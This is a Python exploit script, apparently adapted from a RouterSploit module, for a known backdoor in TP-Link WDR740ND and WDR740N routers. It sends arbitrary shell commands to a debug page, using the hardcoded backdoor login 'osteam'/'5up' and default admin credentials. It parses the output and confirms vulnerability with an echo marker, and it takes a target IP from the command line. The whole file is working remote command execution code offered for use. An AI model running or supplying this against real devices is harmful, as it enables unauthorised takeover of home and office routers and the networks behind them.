target = ""
# rsf exploit module
# description: TP-Link WDR740ND & WDR740N Backdoor RCE
import re
from urllib.parse import quote
import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.username = "admin"
        self.password = "admin"

    def http_request(self, method, path, auth=None):
        url = f"http://{self.target}:{self.port}{path}"
        try:
            if method == "POST":
                response = requests.post(url, auth=auth, timeout=10)
            else:
                response = requests.get(url, auth=auth, timeout=10)
            return response
        except:
            return None

    def execute(self, cmd):
        cmd = quote(cmd)
        path = f"/userRpm/DebugResultRpm.htm?cmd={cmd}&usr=osteam&passwd=5up"
        response = self.http_request("GET", path, auth=(self.username, self.password))
        if response is None or response.status_code != 200:
            return ""

        regexp = r'var cmdResult = new Array\(\n"(.*?)",\n0,0 \);'
        res = re.findall(regexp, response.text)
        if len(res):
            return "\n".join(res[0].replace("\\r\\n", "\r\n").split("\n"))
        return ""

    def check(self):
        marker = "random_marker"
        cmd = f"echo {marker}"
        response = self.execute(cmd)
        return marker in response

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            print("[*] Invoking command shell")
        else:
            print("[-] Exploit failed - target seems to be not vulnerable")



import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
